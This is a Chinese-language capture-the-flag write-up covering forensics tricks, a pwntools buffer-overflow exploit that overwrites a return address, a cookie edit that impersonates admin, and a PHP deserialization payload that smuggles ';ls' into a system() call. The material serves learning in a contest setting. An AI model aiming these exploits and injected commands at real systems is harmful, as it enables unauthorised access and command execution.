# MyFirstCTF

隨意紀錄一下比賽學到的知識與技巧，只紀錄印象較深刻的題目

## forensic

原圖放在forensic目錄

### 0x01

有一張用binwalk看一下 發現圖片中有另外一張圖片

> dd if=`input_file` of=`output_file` skip=`offset_size` bs=1

即可拿到圖片

### 0x02

用mac看來看去看不出端倪 結果用windoes 右鍵內容 flag藏在註解裡面

### 0x03

pdf裡面藏白色文字 全選起來用editor解答

## Pwn

### 0x01 (BOF)

有一點久沒寫exploits生疏了 這題順便紀錄一下

先用gdb info func

看到一個可疑函式 位置在`0x004006b6`

利用BOF讓ret跳轉到0x004006b6


![bof](https://i.imgur.com/vLsNCR9.png)

```python
from pwn import *

r = remote('140.110.112.29',2114)

print(r.recvline())

playload = "A"*56 + p64(0x004006b6)

r.send(playload)

r.interactive()

```


### 0x02 (math)

要在60秒內解完100題數學題 簡單的考你會不會寫程式跟使用pwntools而已

```python

from pwn import *
r = remote('140.110.112.29',5119)
r.recvline() #Can you help us?
r.recvline()


print(r.recvline())

for i in range(100):
	print(r.recvline())

	s = r.recvline()

	one = s.split('?')
	print(one)
	two = one[1].split('=')
	print(two)

	if(int(one[0]) + int(two[0]) == int(two[1])):
		print('+')
		r.sendline('+')
	elif(int(one[0]) - int(two[0]) == int(two[1])):
		print('-')
		r.sendline('-')
	elif(int(one[0]) * int(two[0]) == int(two[1])):
		print('*')
		r.sendline('*')

print(r.recvline())

```

## Web

### 0x01 (session)

用brup抓包

觀察提示的使用者 clara 的封包

=PZge c JryZ l TvNv a Fbgs r eBYt a

只是使用者名稱混雜一些字元

於是把clara的部分admin即可

改完後 `=PZgeaJryZdTvNvmFbgsieBYtn`

requestt出去就拿到flag了

### 0x02 (serialize)

將`__wakeup`中的this改成想要執行的指令(wakup函式在反序列化時一定會執行)

```php
<?php

class MyFirstCTF {
    protected $test = "CTF";
    function __wakeup()
    {
        // print "Wake up yo!<br>";
        // system("echo ".$this->test);
    }
}
$obj = new MyFirstCTF();
$obj->test=";ls";
$ser = serialize($obj);

printf($ser);


// $input = $_GET['str'];
// $kb = unserialize($input);
?>
```
print出來的字串是`O:10:"MyFirstCTF":1:{s:4:"test";s:3:";ls";}`

但是丟出去之後沒反應

猜測應該是protected的關係


### 0x03 (math)
### 0x04 (math)
